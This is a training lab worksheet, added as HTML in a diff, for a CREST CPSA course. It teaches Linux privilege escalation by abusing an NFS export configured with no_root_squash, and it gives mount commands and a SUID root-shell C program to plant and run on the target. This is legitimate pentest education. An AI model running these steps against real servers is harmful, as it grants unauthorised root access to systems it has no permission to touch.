@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lab B13-B: Linux Privesc via NFS</title>
+<style>
+  :root { --orange: #E84E0F; --black: #1A1A1A; --dark: #2a2a2a; --light: #f5f5f5; --border: #ddd; --green: #2d6a2d; --green-bg: #eafaea; --amber: #7a4f00; --amber-bg: #fff8e1; --blue: #003580; --blue-bg: #eef4ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: 'Segoe UI', Arial, sans-serif; background: #fff; color: var(--black); font-size: 15px; line-height: 1.6; }
+  .header { background: var(--black); color: #fff; padding: 24px 40px; display: flex; align-items: center; justify-content: space-between; }
+  .course-title { font-size: 13px; color: #aaa; margin-top: 2px; }
+  .lab-badge { background: var(--orange); color: #fff; font-size: 12px; font-weight: 700; padding: 4px 12px; border-radius: 3px; letter-spacing: 1px; }
+  .hero { background: var(--dark); color: #fff; padding: 32px 40px; border-bottom: 4px solid var(--orange); }
+  .hero-meta { display: flex; gap: 24px; margin-bottom: 12px; flex-wrap: wrap; }
+  .hero-meta span { font-size: 12px; color: #aaa; }
+  .hero-meta strong { color: #fff; }
+  .hero h1 { font-size: 26px; font-weight: 800; margin-bottom: 6px; }
+  .hero p { color: #ccc; font-size: 14px; max-width: 700px; }
+  .container { max-width: 900px; margin: 0 auto; padding: 32px 24px; }
+  .section { margin-bottom: 32px; }
+  .section-title { font-size: 17px; font-weight: 700; color: var(--orange); border-bottom: 2px solid var(--orange); padding-bottom: 6px; margin-bottom: 16px; text-transform: uppercase; letter-spacing: 0.5px; }
+  .objective-list { list-style: none; }
+  .objective-list li { padding: 8px 0 8px 28px; position: relative; border-bottom: 1px solid var(--border); font-size: 14px; }
+  .objective-list li:before { content: "▶"; color: var(--orange); position: absolute; left: 0; font-size: 11px; top: 10px; }
+  .objective-list li:last-child { border-bottom: none; }
+  .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px; margin-bottom: 16px; }
+  .info-card { background: var(--light); border-left: 4px solid var(--orange); padding: 12px 16px; }
+  .info-card .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 4px; letter-spacing: 0.5px; }
+  .info-card .value { font-weight: 700; font-size: 15px; color: var(--black); font-family: monospace; }
+  .step { background: #fff; border: 1px solid var(--border); border-radius: 4px; margin-bottom: 20px; overflow: hidden; }
+  .step-header { background: var(--black); color: #fff; padding: 10px 16px; display: flex; align-items: center; gap: 12px; }
+  .step-num { background: var(--orange); color: #fff; font-weight: 900; font-size: 13px; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+  .step-title { font-weight: 700; font-size: 15px; }
+  .step-body { padding: 16px 20px; }
+  .step-body p { margin-bottom: 10px; font-size: 14px; }
+  pre { background: #1e1e1e; color: #d4d4d4; padding: 14px 16px; border-radius: 4px; font-size: 13px; overflow-x: auto; margin: 10px 0; font-family: 'Consolas', 'Courier New', monospace; line-height: 1.5; }
+  .comment { color: #6a9955; }
+  .cmd { color: #9cdcfe; }
+  .flag { color: #ce9178; }
+  .output { color: #b5cea8; }
+  .answer-box { border: 2px dashed var(--border); border-radius: 4px; padding: 12px 16px; margin: 10px 0; min-height: 60px; background: #fafafa; }
+  .answer-box .label { font-size: 11px; text-transform: uppercase; color: #888; margin-bottom: 6px; letter-spacing: 0.5px; }
+  .answer-line { border: none; border-bottom: 1px solid #ccc; width: 100%; margin-bottom: 8px; padding: 4px 2px; font-size: 14px; background: transparent; display: block; }
+  .callout { border-radius: 4px; padding: 12px 16px; margin: 12px 0; font-size: 13px; display: flex; gap: 10px; }
+  .callout-icon { font-size: 16px; flex-shrink: 0; }
+  .callout.info { background: var(--blue-bg); border-left: 4px solid var(--blue); color: var(--blue); }
+  .callout.warn { background: var(--amber-bg); border-left: 4px solid #c8a000; color: var(--amber); }
+  .callout.tip { background: var(--green-bg); border-left: 4px solid var(--green); color: var(--green); }
+  .callout.exam { background: #fdf0ff; border-left: 4px solid #7b2d8b; color: #5a1d6e; }
+  table { width: 100%; border-collapse: collapse; font-size: 13px; margin: 10px 0; }
+  th { background: var(--black); color: #fff; padding: 8px 12px; text-align: left; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+  td { padding: 8px 12px; border-bottom: 1px solid var(--border); vertical-align: top; }
+  tr:nth-child(even) td { background: var(--light); }
+  .scenario-box { background: var(--blue-bg); border: 1px solid #b3d0ff; border-radius: 4px; padding: 16px 20px; margin-bottom: 20px; }
+  .scenario-box h3 { color: var(--blue); font-size: 14px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 8px; }
+  .scenario-box p { font-size: 14px; color: var(--dark); }
+  .question { background: var(--light); border: 1px solid var(--border); border-radius: 4px; padding: 14px 16px; margin-bottom: 12px; }
+  .question .q-num { font-weight: 700; color: var(--orange); font-size: 13px; margin-bottom: 6px; }
+  .question p { font-size: 14px; margin-bottom: 8px; }
+  .phase-banner { background: var(--orange); color: #fff; padding: 8px 16px; font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 16px; border-radius: 3px; }
+  .footer { background: var(--black); color: #888; text-align: center; padding: 16px; font-size: 12px; margin-top: 40px; }
+  .footer span { color: var(--orange); }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <div style="display:flex;align-items:center;gap:16px;">
+    <div>
+      <div style="font-weight:700;font-size:15px;color:#fff;">My Cyber Academy</div>
+      <div class="course-title">CREST CPSA - Module B: Core Technical Skills</div>
+    </div>
+  </div>
+  <div class="lab-badge">LAB B13-B</div>
+</div>
+
+<div class="hero">
+  <div class="hero-meta">
+    <span><strong>Syllabus Ref:</strong> B13</span>
+    <span><strong>Duration:</strong> 60 minutes</span>
+    <span><strong>Difficulty:</strong> Intermediate-Advanced</span>
+    <span><strong>Targets:</strong> Kali (attacker) + SYNTEX-LNX01</span>
+  </div>
+  <h1>Linux Privilege Escalation via NFS no_root_squash</h1>
+  <p>Exploit a misconfigured NFS export to place a SUID root binary on the server filesystem and achieve root code execution. This technique is remote-to-root and requires no credentials on the target beyond NFS access.</p>
+</div>
+
+<div class="container">
+
+  <div class="scenario-box">
+    <h3>Scenario</h3>
+    <p>During NFS enumeration you discovered that SYNTEX-LNX01 exports <strong>/exports/data</strong> with the <strong>no_root_squash</strong> option. This means when root on your Kali machine writes to that NFS share, the files are created as root on the target - not remapped to nobody. You can exploit this by placing a SUID shell binary in the export and executing it from a low-privilege shell on the target. This is a classic but often overlooked escalation vector.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Learning Objectives</div>
+    <ul class="objective-list">
+      <li>Understand why no_root_squash is a critical NFS misconfiguration</li>
+      <li>Mount the NFS export from Kali as root</li>
+      <li>Compile and place a SUID shell binary via NFS</li>
+      <li>Execute the binary from a low-privilege shell to achieve root</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab Environment</div>
+    <div class="info-grid">
+      <div class="info-card"><div class="label">Attacker (Kali)</div><div class="value">&lt;KALI-IP&gt;</div></div>
+      <div class="info-card"><div class="label">Linux Target</div><div class="value">&lt;LNX01-IP&gt;</div></div>
+      <div class="info-card"><div class="label">NFS Export</div><div class="value">/exports/data</div></div>
+      <div class="info-card"><div class="label">Option</div><div class="value">no_root_squash</div></div>
+    </div>
+    <div class="callout warn">
+      <span class="callout-icon">⚠</span>
+      <div>Replace all IP placeholders with the values shown in your CourseStack Lab Panel. This lab uses BOTH a Kali terminal (as root) and a shell on SYNTEX-LNX01. Have both open simultaneously.</div>
+    </div>
+  </div>
+
+  <!-- Phase 1: NFS Recon -->
+  <div class="section">
+    <div class="phase-banner">Phase 1 - Confirm the NFS Misconfiguration</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">1</div>
+        <div class="step-title">Enumerate NFS Exports</div>
+      </div>
+      <div class="step-body">
+        <p>Confirm the export configuration from your Kali machine before attempting exploitation.</p>
+        <pre><span class="comment"># From Kali - check what is exported</span>
+<span class="cmd">showmount</span> -e &lt;LNX01-IP&gt;
+
+<span class="output">Export list for &lt;LNX01-IP&gt;:
+/exports/data *</span>
+
+<span class="comment"># Check the detailed export options (from the target - if you have SSH access)</span>
+<span class="comment"># SSH in as jsmith and check /etc/exports</span>
+<span class="cmd">ssh</span> jsmith@&lt;LNX01-IP&gt;
+<span class="cmd">cat</span> /etc/exports</pre>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div><strong>What to look for in /etc/exports:</strong> The entry <code>/exports/data *(rw,sync,no_subtree_check,no_root_squash)</code> is the vulnerable configuration. The <code>*</code> means any host can mount it. <code>rw</code> means read-write. <code>no_root_squash</code> is the dangerous part.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">NFS export configuration</div>
+          <input class="answer-line" type="text" placeholder="Full /etc/exports entry for /exports/data" />
+          <input class="answer-line" type="text" placeholder="Is no_root_squash present? (yes/no)" />
+          <input class="answer-line" type="text" placeholder="Which hosts are allowed to mount? (* = anyone)" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 2: Mount and Plant -->
+  <div class="section">
+    <div class="phase-banner">Phase 2 - Mount as Root and Plant the SUID Binary</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">2</div>
+        <div class="step-title">Mount the NFS Share from Kali as Root</div>
+      </div>
+      <div class="step-body">
+        <p>All steps in this phase run on your Kali machine as root. The key: when root mounts no_root_squash NFS, files written to it are owned by root on the server.</p>
+        <pre><span class="comment"># On Kali - become root first</span>
+<span class="cmd">sudo su</span>
+
+<span class="comment"># Create a local mount point</span>
+<span class="cmd">mkdir</span> /mnt/syntex-nfs
+
+<span class="comment"># Mount the NFS share</span>
+<span class="cmd">mount</span> <span class="flag">-t nfs</span> &lt;LNX01-IP&gt;:/exports/data /mnt/syntex-nfs
+
+<span class="comment"># Verify the mount worked</span>
+<span class="cmd">ls -la</span> /mnt/syntex-nfs/
+
+<span class="comment"># Confirm ownership of existing files</span>
+<span class="cmd">ls -la</span> /mnt/syntex-nfs/</pre>
+        <div class="answer-box">
+          <div class="label">NFS mount result</div>
+          <input class="answer-line" type="text" placeholder="Files visible in /mnt/syntex-nfs/" />
+          <input class="answer-line" type="text" placeholder="Who owns the existing files?" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">3</div>
+        <div class="step-title">Compile the SUID Shell Binary</div>
+      </div>
+      <div class="step-body">
+        <p>Create a small C program that drops a root shell when executed. Compile it on Kali, then copy it to the NFS share as root. Setting the SUID bit while root on Kali means the file appears SUID root on the target.</p>
+        <pre><span class="comment"># On Kali as root - write the C source</span>
+<span class="cmd">cat</span> &gt; /tmp/suid_shell.c &lt;&lt;'EOF'
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    setuid(0);
+    setgid(0);
+    system("/bin/bash -p");
+    return 0;
+}
+EOF
+
+<span class="comment"># Compile for the target (same arch - Linux x64)</span>
+<span class="cmd">gcc</span> /tmp/suid_shell.c <span class="flag">-o</span> /mnt/syntex-nfs/rootme
+
+<span class="comment"># Set SUID bit - because we are root on no_root_squash NFS,</span>
+<span class="comment"># this sets SUID root ON THE TARGET</span>
+<span class="cmd">chmod</span> u+s /mnt/syntex-nfs/rootme
+<span class="cmd">chmod</span> +x /mnt/syntex-nfs/rootme
+
+<span class="comment"># Verify the SUID bit was set</span>
+<span class="cmd">ls -la</span> /mnt/syntex-nfs/rootme
+<span class="output">-rwsr-xr-x 1 root root 8432 ... rootme</span></pre>
+        <div class="callout exam">
+          <span class="callout-icon">★</span>
+          <div><strong>CREST Exam Point:</strong> The <code>s</code> in <code>-rwsr-xr-x</code> is the SUID bit. When a non-root user executes a file with this bit set and the file is owned by root, the process runs as root. This is the core of the no_root_squash attack.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">SUID binary placed</div>
+          <input class="answer-line" type="text" placeholder="ls -la output for rootme" />
+          <input class="answer-line" type="text" placeholder="Who owns rootme on the target?" />
+          <input class="answer-line" type="text" placeholder="Is the SUID bit set? (look for 's' in permissions)" />
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Phase 3: Execute -->
+  <div class="section">
+    <div class="phase-banner">Phase 3 - Execute from the Target</div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">4</div>
+        <div class="step-title">Execute the SUID Binary as jsmith</div>
+      </div>
+      <div class="step-body">
+        <p>Switch to your SSH session on SYNTEX-LNX01 as jsmith. The binary you placed is in /exports/data/ - execute it to get a root shell.</p>
+        <pre><span class="comment"># On SYNTEX-LNX01 as jsmith</span>
+<span class="cmd">ls -la</span> /exports/data/
+<span class="comment"># You should see rootme with the SUID bit set and owned by root</span>
+
+<span class="comment"># Execute it</span>
+<span class="cmd">/exports/data/rootme</span>
+
+<span class="comment"># Confirm root</span>
+<span class="cmd">id</span>
+<span class="cmd">whoami</span>
+<span class="output">uid=0(root) gid=0(root) groups=0(root),1001(jsmith)</span></pre>
+        <div class="callout info">
+          <span class="callout-icon">ℹ</span>
+          <div><strong>-p flag in bash:</strong> The <code>bash -p</code> in the C source tells bash not to drop privileges when it detects a SUID parent. Without <code>-p</code> modern bash drops effective UID back to the real UID as a security measure.</div>
+        </div>
+        <div class="answer-box">
+          <div class="label">Root achieved via NFS</div>
+          <input class="answer-line" type="text" placeholder="id output after executing rootme" />
+          <input class="answer-line" type="text" placeholder="hostname and uname -a" />
+        </div>
+      </div>
+    </div>
+
+    <div class="step">
+      <div class="step-header">
+        <div class="step-num">5</div>
+        <div class="step-title">Cleanup (Important)</div>
+      </div>
+      <div class="step-body">
+        <p>After demonstrating exploitation, clean up the planted binary. Good testers leave systems clean.</p>
+        <pre><span class="comment"># On Kali as root - remove the planted binary</span>
+<span class="cmd">rm</span> /mnt/syntex-nfs/rootme
+
+<span class="comment"># Unmount the NFS share</span>
+<span class="cmd">umount</span> /mnt/syntex-nfs
+
+<span class="comment"># Verify it is gone from the target</span>
+<span class="comment"># Back on SYNTEX-LNX01 as jsmith:</span>
+<span class="cmd">ls -la</span> /exports/data/
+<span class="comment"># rootme should no longer be present</span></pre>
+      </div>
+    </div>
+  </div>
+
+  <!-- Knowledge Check -->
+  <div class="section">
+    <div class="section-title">Knowledge Check</div>
+
+    <div class="question">
+      <div class="q-num">Q1</div>
+      <p>Explain what <code>no_root_squash</code> does in an NFS export configuration and why the default behaviour (root squashing) is the safer option.</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="What no_root_squash does" />
+        <input class="answer-line" type="text" placeholder="Why root squashing is safer" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q2</div>
+      <p>You discover an NFS share exported with <code>no_root_squash</code> but the export is read-only (<code>ro</code>). Can you still exploit it? Explain your reasoning.</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Can it be exploited? Why or why not?" />
+      </div>
+    </div>
+
+    <div class="question">
+      <div class="q-num">Q3</div>
+      <p>What two remediation steps would you recommend for the <code>no_root_squash</code> finding?</p>
+      <div class="answer-box">
+        <input class="answer-line" type="text" placeholder="Remediation 1" />
+        <input class="answer-line" type="text" placeholder="Remediation 2" />
+      </div>
+    </div>
+  </div>
+
+  <div class="callout exam">
+    <span class="callout-icon">★</span>
+    <div><strong>Lab Complete - Key Takeaways:</strong> The no_root_squash NFS attack is elegant because it requires no prior credentials on the target - just NFS access. CREST examiners value candidates who recognise NFS misconfigurations and can articulate the exact attack path: mount as root, plant SUID binary, execute from target. Always clean up planted binaries and document the finding with the /etc/exports entry as evidence.</div>
+  </div>
+
+</div>
+
+<div class="footer">
+  <span>My Cyber Academy</span> - CREST CPSA - Module B Lab B13-B - NFS Privilege Escalation v1
+</div>
+
+</body>
+</html>
